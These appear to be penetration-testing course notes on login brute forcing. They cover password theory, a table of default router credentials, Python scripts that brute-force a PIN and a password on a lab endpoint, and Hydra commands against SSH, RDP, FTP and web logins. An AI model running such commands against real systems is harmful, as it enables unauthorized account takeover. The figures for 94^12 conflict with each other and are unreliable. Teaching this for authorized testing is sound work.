
# Login Brute Forcing

## What is Brute Forcing?
Brute forcing is a trial-and-error method used to crack passwords, login credentials, or encryption keys by trying every possible combination of characters until the correct one is found.

### Key Factors:
- **Password complexity**: Longer, more complex passwords are harder to crack.
- **Computational power**: More powerful hardware accelerates the process.
- **Security measures**: Measures like account lockouts and CAPTCHAs slow down brute force attempts.

## How Brute Forcing Works:
1. **Start**: Attacker initiates brute force using specialized software.
2. **Generate Combination**: Software generates potential password combinations.
3. **Apply Combination**: The system tests the combination.
4. **Check if Successful**: The system evaluates if the combination is correct.
5. **Access Granted**: If successful, unauthorized access is granted.
6. **End**: If unsuccessful, the process repeats with new combinations.

## Types of Brute Forcing:
- **Simple Brute Force**: Systematically tries all possible combinations.
- **Dictionary Attack**: Uses a list of common words and phrases.
- **Hybrid Attack**: Combines brute force and dictionary attack strategies.
- **Credential Stuffing**: Uses leaked credentials to access multiple services.
- **Password Spraying**: Attempts common passwords on many accounts to avoid lockouts.
- **Rainbow Table Attack**: Uses pre-computed password hashes for quicker cracking.
- **Reverse Brute Force**: Targets a single password against multiple usernames.
- **Distributed Brute Force**: Distributes the brute-force load across multiple machines.

## Brute Forcing in Penetration Testing
Brute forcing is a tool used in penetration testing to identify weaknesses in password-based authentication:
- **When other methods fail**: If no vulnerabilities are found, brute forcing may be employed.
- **Weak password policies**: Systems with weak password policies are vulnerable.
- **Targeting specific accounts**: Brute forcing can focus on accounts with elevated privileges.

---

# Password Security Fundamentals

### Importance of Strong Passwords:
- **Stronger passwords**: Harder for attackers to crack through brute force.
- **Longer passwords**: Exponentially increase the combinations an attacker must try.

### Anatomy of a Strong Password:
- **Length**: Minimum 12 characters; longer passwords are better.
- **Complexity**: Use a mix of upper and lowercase letters, numbers, and symbols.
- **Uniqueness**: Avoid reusing passwords across different accounts.
- **Randomness**: Avoid dictionary words or personal information.

### Common Password Weaknesses:
- **Short passwords**: Easily cracked with fewer combinations.
- **Common words and phrases**: Vulnerable to dictionary attacks.
- **Personal information**: Can be easily guessed by attackers using social engineering.
- **Reusing passwords**: Increases risk if one account is compromised.
- **Predictable patterns**: Simple sequences like “123456” or “qwerty.”

## Password Policies
Organizations use password policies to enforce strong password practices:
- **Minimum length**: Enforcing a minimum number of characters.
- **Complexity**: Requiring specific character types (e.g., symbols, numbers).
- **Expiration**: Requiring regular password changes.
- **Password history**: Preventing reuse of previous passwords.

### Default Credentials:
- **Default passwords**: Simple and often easily guessable passwords for devices or services.
- **Default usernames**: Common usernames like "admin" or "root" pose a security risk.

| Device/Manufacturer | Default Username | Default Password | Device Type |
|---------------------|------------------|------------------|-------------|
| Linksys Router      | admin            | admin            | Router      |
| D-Link Router       | admin            | admin            | Router      |
| Netgear Router      | admin            | password         | Router      |
| Canon Printer       | admin            | admin            | Printer     |

## Brute-Forcing & Password Security
- **Evaluating vulnerabilities**: Brute force can highlight weak password practices.
- **Strategic tool selection**: Complexity of passwords influences which brute force method is used.
- **Resource allocation**: Time and power needed depend on password strength.
- **Exploiting default credentials**: Default passwords are often the weakest points in security.

---

# Brute Force Attacks

## Overview
Brute force attacks are a method of cracking passwords, encryption keys, or PINs by systematically trying all possible combinations until the correct one is found. The complexity of brute-forcing increases exponentially as the password length and character set grow, which significantly affects the time and resources required to crack the password.

## Mathematical Foundation of Brute Force
### Formula:
**Possible Combinations = Character Set Size ^ Password Length**

Example:
- **6-character password** with only lowercase letters (26 characters):  
  `26^6 ≈ 300 million possible combinations`
- **8-character password** with only lowercase letters:  
  `26^8 ≈ 200 billion possible combinations`
- **12-character password** with lowercase, uppercase, numbers, and symbols:  
  `94^12 ≈ 475 trillion combinations`

### Impact of Password Length and Complexity
Increasing password length or character set (adding uppercase letters, numbers, symbols) exponentially increases the number of possible combinations, making brute-forcing more challenging.

| **Password Length** | **Character Set**                               | **Possible Combinations**         |
|---------------------|-------------------------------------------------|----------------------------------|
| 6                   | Lowercase letters (a-z)                        | 26^6 ≈ 300 million              |
| 8                   | Lowercase letters (a-z)                        | 26^8 ≈ 200 billion              |
| 8                   | Lowercase + Uppercase letters (a-z, A-Z)       | 52^8 ≈ 53 trillion              |
| 12                  | Lowercase + Uppercase + Numbers + Symbols      | 94^12 ≈ 475 trillion trillion   |

## Brute Force Speed and Hardware Influence
- **Basic Computer (1 million passwords/second)**:  
  Adequate for cracking simple passwords, but becomes impractical for complex passwords.
  - Example: Cracking an 8-character alphanumeric password would take ~6.92 years.
  
- **Supercomputer (1 trillion passwords/second)**:  
  Greatly accelerates brute-forcing, but even with massive resources, cracking complex passwords can still take an impractical amount of time.
  - Example: Cracking a 12-character password with all ASCII characters would take ~15,000 years.

## Practical Example: Cracking a 4-Digit PIN
The following Python script demonstrates a brute-force attack on a simple system that generates a random 4-digit PIN.

### Python Code: `pin-solver.py`
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send request to server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if correct PIN found
    if response.ok and 'flag' in response.json():  # .ok means status code 200
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```

### Process:
1. The script systematically attempts all possible PINs (0000 to 9999).
2. It sends GET requests to a server endpoint `/pin` with each PIN.
3. The server responds with success and a flag when the correct PIN is guessed.

---

# Dictionary Attacks: Overview

## What is a Dictionary Attack?
A **dictionary attack** exploits human tendencies to use predictable, simple passwords like dictionary words or common phrases. By using a precompiled list of likely passwords, attackers can efficiently crack weak passwords, making it faster than brute-forcing.

## Brute Force vs. Dictionary Attack

| Feature                 | Dictionary Attack                                    | Brute Force Attack                              |
|-------------------------|------------------------------------------------------|-------------------------------------------------|
| **Efficiency**           | Faster and more efficient                           | Time-consuming and resource-intensive           |
| **Targeting**            | Can be tailored based on target info                | No targeting, tests all combinations            |
| **Effectiveness**        | Works well for weak passwords                       | Works for all passwords, but slower             |
| **Limitations**          | Ineffective against complex passwords               | Inefficient for complex passwords               |

## Wordlist Creation
- **Public Lists**: Collections of common passwords (e.g., rockyou.txt).
- **Custom Lists**: Built from target-specific information.
- **Pre-existing Lists**: Available with tools like SecLists.

### Example Wordlists:
| Wordlist                        | Description                                           | Source                |
|----------------------------------|-------------------------------------------------------|-----------------------|
| rockyou.txt                      | List of passwords from the RockYou breach.            | RockYou breach dataset|
| 2023-200_most_used_passwords.txt | Most used passwords as of 2023                        | SecLists              |

## Example: Dictionary Attack Script
### Python Script: `dictionary-solver.py`
```python
import requests

ip = "127.0.0.1"  # Your IP address
port = 1234       # Your port number

passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

for password in passwords:
    print(f"Attempted password: {password}")
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})
    if response.ok and 'flag' in response.json():
        print(f"Correct password: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

---

# Hybrid Attacks

## What are Hybrid Attacks?
Hybrid attacks combine dictionary and brute-force techniques to exploit predictable password modifications. Users often make small changes to their passwords (e.g., adding a number or special character), and hybrid attacks capitalize on these patterns by systematically testing both standard dictionary passwords and slight variations.

### Example:
1. **Dictionary Attack**: The attacker starts with a list of common passwords.
2. **Brute-Force**: If the dictionary attack fails, it switches to modifying the dictionary words (e.g., appending numbers or special characters).

## The Power of Hybrid Attacks
Hybrid attacks are efficient because they leverage both dictionary attacks and brute-force strategies, adapting based on the results. They are particularly effective against predictable password changes, such as those triggered by password expiration policies.

### Filtering Wordlists for Hybrid Attacks
To optimize the attack, you can filter wordlists to match specific password policies:

1. **Minimum Length**:
   ```bash
   $ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
   ```
2. **At Least One Uppercase**:
   ```bash
   $ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
   ```
3. **At Least One Lowercase**:
   ```bash
   $ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
   ```
4. **At Least One Number**:
   ```bash
   $ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
   ```

These filters narrow down the search space, improving the efficiency of the attack.

### Result of Filtering:
By the end of the filtering process, you reduce the number of potential passwords to a manageable list, significantly improving attack speed and efficiency. 

## Credential Stuffing: Exploiting Password Reuse

### What is Credential Stuffing?
Credential stuffing takes advantage of password reuse. Attackers use leaked password data from breaches to test against multiple online services. The goal is to gain unauthorized access to accounts using stolen usernames and passwords.

### How It Works:
1. **Acquisition**: Attackers obtain credential lists (e.g., from breaches).
2. **Automated Attack**: Using tools or scripts, they test these credentials against various sites.
3. **Success**: If credentials match, attackers gain access to sensitive data or accounts.

### The Problem of Password Reuse:
Password reuse is a major risk. If a user’s password is compromised on one platform, all other accounts using the same password are vulnerable.

---

# Hydra 

Hydra is a powerful brute-force tool used to crack authentication credentials for various services. It is widely used in penetration testing to test the security of login mechanisms.  

#### **Why Use Hydra?**
- **Speed & Efficiency** – Uses parallel connections to attempt multiple logins simultaneously.  
- **Versatility** – Supports many protocols including SSH, FTP, HTTP, RDP, databases, and more.  
- **Easy to Use** – Simple command-line interface with a clear syntax.  


### **Installation & Setup:**
Hydra is pre-installed on most penetration testing distributions (e.g., Kali Linux).  

To check if Hydra is installed:  
```bash
hydra -h
```
If not installed, install it on Debian-based systems using:  
```bash
sudo apt-get update && sudo apt-get install hydra
```



### **Basic Hydra Syntax:**
```bash
hydra [options] service://target
```

#### **Common Parameters:**
| Option | Description | Example |
|--------|------------|---------|
| `-l USER` / `-L FILE` | Single username / List of usernames | `-l admin` / `-L usernames.txt` |
| `-p PASS` / `-P FILE` | Single password / List of passwords | `-p password123` / `-P passwords.txt` |
| `-t TASKS` | Number of parallel attack attempts | `-t 4` |
| `-f` | Stop after first successful login | `-f` |
| `-s PORT` | Specify a non-default port | `-s 2222` |
| `-v` / `-V` | Verbose output (detailed attack info) | `-V` for more details |


### **Hydra Service Modules:**
Hydra supports a variety of services for brute-force attacks. Some commonly used ones include:

| **Service** | **Protocol** | **Description** | **Example Command** |
|------------|------------|----------------|------------------|
| **FTP** | File Transfer Protocol | Cracks FTP login credentials | `hydra -l admin -P passwords.txt ftp://192.168.1.100` |
| **SSH** | Secure Shell | Brute-force SSH logins | `hydra -l root -P passwords.txt ssh://192.168.1.100` |
| **HTTP-POST** | Web Login Forms | Cracks web authentication | `hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` |
| **SMTP** | Email Authentication | Cracks email server login credentials | `hydra -l admin -P passwords.txt smtp://mail.example.com` |
| **IMAP/POP3** | Email Access Protocols | Tests email account credentials | `hydra -l user@example.com -P passwords.txt imap://mail.example.com` |
| **MySQL/MSSQL** | Database Authentication | Brute-force login for database access | `hydra -l root -P passwords.txt mysql://192.168.1.100` |
| **RDP** | Remote Desktop Protocol | Cracks Windows RDP logins | `hydra -l administrator -P passwords.txt rdp://192.168.1.100` |


### **Practical Attack Scenarios**

#### **1. SSH Brute-Force Attack**
Targeting an SSH service using a wordlist of passwords:  
```bash
hydra -l root -P passwords.txt ssh://192.168.1.100
```
This command:  
✅ Uses "root" as the username  
✅ Tries all passwords from `passwords.txt`  
✅ Targets SSH on `192.168.1.100`  


#### **2. Brute-Forcing HTTP Authentication**
If a website uses basic HTTP authentication, Hydra can brute-force it:  
```bash
hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
✅ Uses a list of usernames from `usernames.txt`  
✅ Tries all passwords from `passwords.txt`  
✅ Targets the login authentication of `www.example.com`  



#### **3. Brute-Forcing a Web Login Form**
If the login form requires a username and password via a POST request:  
```bash
hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
✅ Uses "admin" as the username  
✅ Tries all passwords from `passwords.txt`  
✅ Targets `/login` endpoint  
✅ Looks for HTTP status `302` to identify a successful login  


#### **4. Brute-Forcing Multiple SSH Targets**
If multiple SSH servers are listed in a file (`targets.txt`):  
```bash
hydra -l root -p toor -M targets.txt ssh
```
✅ Uses "root" as the username  
✅ Tries "toor" as the password  
✅ Targets all IPs listed in `targets.txt`  


#### **5. Testing FTP Credentials on a Non-Standard Port**
If an FTP service runs on a non-default port (e.g., `2121`):  
```bash
hydra -L usernames.txt -P passwords.txt -s 2121 ftp://ftp.example.com
```
✅ Targets FTP service on `ftp.example.com`  
✅ Uses port `2121`  
✅ Tries all username-password combinations from the lists  



#### **6. Advanced RDP Brute-Forcing**
If the password format is unknown but has a defined length and character set:  
```bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
✅ Uses "administrator" as the username  
✅ Generates passwords between `6-8` characters using a defined charset  
✅ Targets the RDP service on `192.168.1.100`  


---

# **Basic HTTP Authentication & Hydra Brute-Forcing**

## **Understanding Basic Auth**
- A simple authentication method where credentials (username:password) are encoded in Base64.
- Credentials are sent in the `Authorization` header as:  
  ```
  Authorization: Basic <encoded_credentials>
  ```
- Vulnerable to brute-force attacks as credentials are only encoded, not encrypted.

## **Hydra Brute-Force Attack on Basic Auth**
### **Download a Wordlist (if needed)**
```bash
curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
```

### **Hydra Command Breakdown**
```bash
hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```
#### **Explanation:**
| Parameter | Description |
|-----------|------------|
| `-l basic-auth-user` | Specifies the username (`basic-auth-user`) |
| `-P 2023-200_most_used_passwords.txt` | Uses the given password wordlist |
| `127.0.0.1` | Target IP (localhost in this case) |
| `http-get /` | Targets an HTTP service with GET requests on `/` (root path) |
| `-s 81` | Specifies port `81` instead of the default `80` |

### **Expected Output**
- Hydra will attempt each password from the list.
- Once a valid password is found, it will be displayed.
- Example:
  ```
  [81][http-get] host: 127.0.0.1   login: basic-auth-user   password: found-password
  ```
